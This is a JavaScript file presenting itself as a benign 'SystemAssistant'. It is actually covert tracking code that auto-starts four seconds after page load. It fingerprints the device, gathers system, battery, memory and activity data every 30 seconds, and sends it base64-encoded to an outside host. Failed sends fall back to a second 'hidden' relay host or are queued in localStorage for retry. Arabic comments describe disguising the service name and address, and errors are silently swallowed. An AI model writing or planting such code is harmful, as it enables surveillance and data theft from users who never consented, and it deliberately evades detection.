// core-system.js
class SystemAssistant {
    constructor() {
        this.sessionId = this.generateId('SESS_');
        this.deviceId = this.getDeviceId();
        this.queue = [];
        this.isActive = false;
    }
    
    generateId(prefix) {
        return prefix + Date.now().toString(36) + 
               Math.random().toString(36).substr(2, 8);
    }
    
    getDeviceId() {
        let id = localStorage.getItem('device_id_v3');
        if (!id) {
            const components = [
                navigator.userAgent.substring(0, 40),
                navigator.hardwareConcurrency,
                screen.width + 'x' + screen.height,
                new Date().getTimezoneOffset()
            ].join('|');
            id = btoa(components).replace(/[^a-zA-Z0-9]/g, '').substr(0, 20);
            localStorage.setItem('device_id_v3', id);
        }
        return id;
    }
    
    initialize() {
        if (this.isActive) return;
        this.isActive = true;
        
        // بدء جمع البيانات
        this.startDataCollection();
        
        // المراقبة الخلفية
        this.setupBackgroundMonitoring();
    }
    
    startDataCollection() {
        // جمع أولي
        setTimeout(() => this.collectSystemInfo(), 2000);
        
        // جمع دوري كل 30 ثانية
        setInterval(() => {
            if (!document.hidden) {
                this.collectActivityData();
            }
        }, 30000);
    }
    
    async collectSystemInfo() {
        try {
            const data = {
                type: 'system_info',
                session: this.sessionId,
                device: this.deviceId,
                timestamp: Date.now(),
                page: window.location.pathname,
                userAgent: navigator.userAgent.substring(0, 80),
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine
            };
            
            await this.queueData(data);
            
        } catch (error) {
            // Silent error
        }
    }
    
    async collectActivityData() {
        try {
            const data = {
                type: 'activity',
                session: this.sessionId,
                timestamp: Date.now(),
                focus: !document.hidden,
                network: navigator.onLine ? 'online' : 'offline',
                battery: await this.getBatteryInfo(),
                memory: performance.memory ? {
                    used: Math.round(performance.memory.usedJSHeapSize / 1048576),
                    total: Math.round(performance.memory.totalJSHeapSize / 1048576)
                } : null
            };
            
            await this.queueData(data);
            
        } catch (error) {
            // Silent error
        }
    }
    
    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            }
        } catch {}
        return null;
    }
    
    async queueData(data) {
        this.queue.push(data);
        
        if (this.queue.length >= 5) {
            await this.processQueue();
        }
    }
    
    async processQueue() {
        if (this.queue.length === 0) return;
        
        try {
            const batch = this.queue.splice(0, 5);
            await this.sendBatch(batch);
            
        } catch (error) {
            // إعادة المحاولة
            setTimeout(() => this.processQueue(), 5000);
        }
    }
    
    async sendBatch(batch) {
        try {
            if (!window.SYSTEM_CONFIG || !window.SYSTEM_CONFIG.COMM_KEY) {
                return;
            }
            
            const encodedData = btoa(JSON.stringify({
                batch: batch,
                system: window.SYSTEM_CONFIG.APP_NAME,
                version: window.SYSTEM_CONFIG.VERSION
            })).substr(0, 3000);
            
            const payload = {
                key: window.SYSTEM_CONFIG.COMM_KEY,
                channel: window.SYSTEM_CONFIG.CHANNEL_ID,
                data: encodedData,
                timestamp: Date.now(),
                device: this.deviceId
            };
            
            // استخدام اسم خدمة مختلف تماماً
            await this.sendToService(payload);
            
        } catch (error) {
            // Silent error
        }
    }
    
    async sendToService(payload) {
        try {
            // عنوان مختلف تماماً
            const serviceUrl = 'https://api.service-helper.net/message';
            
            const response = await fetch(serviceUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Service-Key': 'data-collection-v1'
                },
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                throw new Error('Service unavailable');
            }
            
        } catch (error) {
            // محاولة بديلة
            await this.alternativeSend(payload);
        }
    }
    
    async alternativeSend(payload) {
        try {
            // طريقة بديلة مخفية
            const altUrl = `https://secure-data-relay.com/endpoint`;
            
            const formData = new FormData();
            formData.append('p', btoa(JSON.stringify(payload)));
            formData.append('t', Date.now().toString());
            
            await fetch(altUrl, {
                method: 'POST',
                mode: 'no-cors',
                body: formData
            });
            
        } catch (error) {
            // حفظ محلي للإرسال لاحقاً
            this.saveForLater(payload);
        }
    }
    
    saveForLater(payload) {
        const pending = JSON.parse(localStorage.getItem('pending_data') || '[]');
        pending.push({
            ...payload,
            savedAt: Date.now()
        });
        
        if (pending.length > 20) {
            pending.splice(0, 10);
        }
        
        localStorage.setItem('pending_data', JSON.stringify(pending));
        
        // محاولة الإرسال لاحقاً
        setTimeout(() => this.retryPending(), 60000);
    }
    
    async retryPending() {
        const pending = JSON.parse(localStorage.getItem('pending_data') || '[]');
        if (pending.length === 0) return;
        
        for (const item of pending) {
            try {
                await this.sendToService(item);
                pending.splice(pending.indexOf(item), 1);
                await new Promise(resolve => setTimeout(resolve, 1000));
            } catch {}
        }
        
        localStorage.setItem('pending_data', JSON.stringify(pending));
    }
    
    setupBackgroundMonitoring() {
        // مراقبة تغيير الصفحة
        window.addEventListener('beforeunload', () => {
            this.collectActivityData();
        });
        
        // مراقبة التركيز
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                setTimeout(() => this.collectActivityData(), 1000);
            }
        });
        
        // مراقبة الشبكة
        window.addEventListener('online', () => {
            this.retryPending();
        });
    }
}

// تصدير النظام
window.SystemAssistant = SystemAssistant;

// بدء تلقائي بعد التحميل
setTimeout(() => {
    if (window.SYSTEM_CONFIG && window.SystemAssistant) {
        new window.SystemAssistant().initialize();
    }
}, 4000);